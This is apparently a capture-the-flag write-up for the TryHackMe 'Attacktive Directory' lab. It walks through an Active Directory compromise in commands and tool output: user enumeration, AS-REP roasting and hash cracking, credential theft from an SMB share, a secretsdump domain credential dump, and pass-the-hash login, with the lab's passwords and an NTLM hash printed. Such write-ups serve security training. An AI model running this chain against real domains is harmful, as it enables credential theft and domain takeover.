
# Enumerations

```nmap
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-15 18:11:23Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2025-02-14T18:06:55
|_Not valid after:  2025-08-16T18:06:55
|_ssl-date: 2025-02-15T18:11:34+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-02-15T18:11:26+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-02-15T18:11:30
|_  start_date: N/A
```

```enum4linux
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

S-1-5-21-3591857110-2884097990-301047963-500 THM-AD\Administrator (Local User)                                 
S-1-5-21-3591857110-2884097990-301047963-501 THM-AD\Guest (Local User)
S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\krbtgt (Local User)
S-1-5-21-3591857110-2884097990-301047963-512 THM-AD\Domain Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-513 THM-AD\Domain Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-514 THM-AD\Domain Guests (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-515 THM-AD\Domain Computers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-516 THM-AD\Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-517 THM-AD\Cert Publishers (Local Group)
S-1-5-21-3591857110-2884097990-301047963-518 THM-AD\Schema Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-519 THM-AD\Enterprise Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-520 THM-AD\Group Policy Creator Owners (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-521 THM-AD\Read-only Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-522 THM-AD\Cloneable Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-525 THM-AD\Protected Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-526 THM-AD\Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-527 THM-AD\Enterprise Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\ATTACKTIVEDIREC$ (Local User)
```


```kerbrute
kerbrute userenum -d spookysec.local --dc 10.10.99.34 users.txt

2025/02/15 14:49:11 >  Using KDC(s):
2025/02/15 14:49:11 >   10.10.99.34:88

2025/02/15 14:49:11 >  [+] VALID USERNAME:       james@spookysec.local
2025/02/15 14:49:12 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2025/02/15 14:49:13 >  [+] VALID USERNAME:       James@spookysec.local
2025/02/15 14:49:13 >  [+] VALID USERNAME:       robin@spookysec.local
2025/02/15 14:49:17 >  [+] VALID USERNAME:       darkstar@spookysec.local
2025/02/15 14:49:19 >  [+] VALID USERNAME:       administrator@spookysec.local
2025/02/15 14:49:24 >  [+] VALID USERNAME:       backup@spookysec.local
2025/02/15 14:49:25 >  [+] VALID USERNAME:       paradox@spookysec.local
2025/02/15 14:49:38 >  [+] VALID USERNAME:       JAMES@spookysec.local
2025/02/15 14:49:43 >  [+] VALID USERNAME:       Robin@spookysec.local
2025/02/15 14:50:09 >  [+] VALID USERNAME:       Administrator@spookysec.local
2025/02/15 14:51:04 >  [+] VALID USERNAME:       Darkstar@spookysec.local
2025/02/15 14:51:21 >  [+] VALID USERNAME:       Paradox@spookysec.local
2025/02/15 14:52:34 >  [+] VALID USERNAME:       DARKSTAR@spookysec.local
2025/02/15 14:52:52 >  [+] VALID USERNAME:       ori@spookysec.local
2025/02/15 14:53:24 >  [+] VALID USERNAME:       ROBIN@spookysec.local
2025/02/15 14:54:43 >  Done! Tested 73317 usernames (16 valid) in 331.975 seconds
```

==> VALID USERNAME : svc-admin@spookysec.local et backup@spookysec.local

# Exploitation

ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set

```shell
$ python3.13 /usr/share/doc/python3-impacket/examples/GetNPUsers.py spookysec.local/svc-admin                     
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Cannot authenticate svc-admin, getting its TGT
/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:4efd0c4fecca024ffe7a72bac4af9e2b$bfc014cd096fc4d9db102d07c4a00c6c76438a86348a67e50de5d3965553697ee7e9d45e6f443209cd2a6580223d4c6c90781589142bc169d7acc819fbb0904571bfb05e43371316bff287a753d0bb96e470995dffb4b7f13f69dbfc2daa7b7eb46f36c298bb3224c3934c943c39c2e69cfd45ef2139a379a07352136fc5a3d051bc662da111e76e295413e265e5a99eada2dc129eaf51ce5025a5bb00e26aadc34bab804404d2125144ae85ea46214d9b5ec74622d1ff25b702d5f607b8970285ee9e34a7fcc1c4962c01b64a58193ea66b3aaf42ab13277ed180f4ffd601a65d795c04416044fb9ca6e39f2c5b37b15325
```

```shell
hashcat -m 18200 hash passwords.txt --force
DONE

hashcat --show hash

$krb5asrep$23$svc-...325:management2005
```

**svc-admin:management2005**

# Enumeration SMB

```shell
smbclient -L spookysec.local --user svc-admin
Password for [WORKGROUP\svc-admin]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
```

```sh
$ smbclient //spookysec.local/backup -U svc-admin
Password for [WORKGROUP\svc-admin]:

smb: \> ls
  backup_credentials.txt              A       48  Sat Apr  4 15:08:53 2020
smb: \> get backup_credentials.txt 
```

```sh
$ base64 -d backup_credentials.txt 
backup@spookysec.local:backup2517860
```

# Domain PrivEsc

```
python3.13 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc backup@spookysec.local
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
...
```

```hash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
```

# Flags submission

```sh
$ evil-winrm  -i 10.10.99.34 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc

PS C:\Users\Administrator\Documents> whoami
thm-ad\administrator

```

```sh
PS C:\Users\Administrator\Desktop> cat root.txt
TryHackMe{4ctiv=============M4st3r}
```

```
PS C:\Users\svc-admin\Desktop> cat user*
TryHackMe{K3rb=============4uth}
```

```
PS C:\Users\backup\Desktop> cat Pri*
TryHackMe{B4ck=============0tty!}
```
